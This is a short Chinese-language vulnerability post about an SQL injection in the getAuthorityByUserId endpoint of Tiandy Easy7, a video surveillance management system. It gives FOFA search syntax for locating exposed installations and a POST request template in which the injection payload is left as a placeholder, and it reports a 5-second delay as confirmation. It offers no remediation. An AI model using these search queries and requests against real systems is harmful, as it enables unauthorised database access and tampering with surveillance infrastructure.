#  天地伟业Easy7 /Easy7/rest/user/getAuthorityByUserId SQL注入漏洞  
 0day收割机   2026-05-11 09:03  
  
# 漏洞简介  
  
天地伟业Easy7是一款用于视频监控管理的  
软件  
系统。  
  
该系统的 /Easy7/rest/user/getAuthorityByUserId 接口存在SQL注入漏洞，攻击者可以通过构造恶意请求执行任意SQL语句，可能导致敏感信息泄露或数据库被篡改。  
# 影响版本  
# fofa语法  
> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"  
  
# 漏洞复现  
```
POST /Easy7/rest/user/getAuthorityByUserId HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

userId=1&objId=SQLI_POC&authTypes=[1]
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBicO6tH09ibyMfDFvf0Ao2KgIiaWMK7WCUMDebfZcAIbVFghic8bt0uumAgvHM8ySCibCiaibVM6SIcNwan4nTUBbE3BknlHJAWFNViaI/640?wx_fmt=png&from=appmsg "")  
  
成功延时5秒  
  
